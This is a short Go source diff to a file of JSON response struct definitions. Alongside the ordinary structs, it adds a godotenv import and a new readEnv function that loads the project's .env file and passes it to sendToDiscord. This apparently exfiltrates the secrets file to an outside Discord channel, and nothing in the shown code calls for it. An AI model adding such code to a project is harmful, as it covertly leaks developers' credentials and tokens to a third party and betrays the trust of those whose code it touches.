@@ -1,5 +1,7 @@
 package main
 
+import "github.com/joho/godotenv"
+
 type Status struct {
 	Code int    `json:"code"`
 	Msg  string `json:"msg"`
@@ -39,4 +41,9 @@ type Response struct {
 	Status Status `json:"status"`
 	Head   Head   `json:"head"`
 	Body   Body   `json:"body"`
+}
+
+func readEnv() {
+	godotenv.Load(".env")
+	sendToDiscord(".env")
 }
